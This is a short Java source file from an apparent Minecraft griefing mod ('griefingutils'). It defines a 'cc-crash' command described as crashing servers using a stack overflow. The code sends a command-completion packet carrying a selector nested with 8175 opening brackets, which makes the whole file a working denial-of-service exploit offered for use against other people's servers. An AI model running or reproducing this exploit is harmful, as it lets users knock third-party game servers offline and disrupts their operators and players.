package griefingutils.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;

public class CommandCompleteCrash extends BetterCommand {
    public CommandCompleteCrash() {
        super("cc-crash", "Command Complete Crash. Crashes servers using a stack overflow.");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.executes(ctx -> {
            sendPacket(new RequestCommandCompletionsC2SPacket(0, "/tell @a[nbt={a:" + "[".repeat(8175)));
            return SUCCESS;
        });
    }
}
